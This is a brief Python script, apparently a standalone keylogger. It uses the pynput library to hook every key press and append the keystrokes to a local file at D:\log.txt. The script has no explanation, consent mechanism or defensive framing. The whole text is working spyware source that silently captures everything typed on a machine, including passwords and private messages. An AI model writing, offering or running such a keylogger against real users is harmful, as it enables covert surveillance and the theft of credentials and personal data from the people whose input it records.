from pynput.keyboard import Listener

def writeoffile(key):
    keydata = str(key)
    keydata=keydata.replace("'","")
    with open("D:\log.txt","a") as f:
        f.write(keydata)

with Listener(on_press=writeoffile) as l:
    l.join()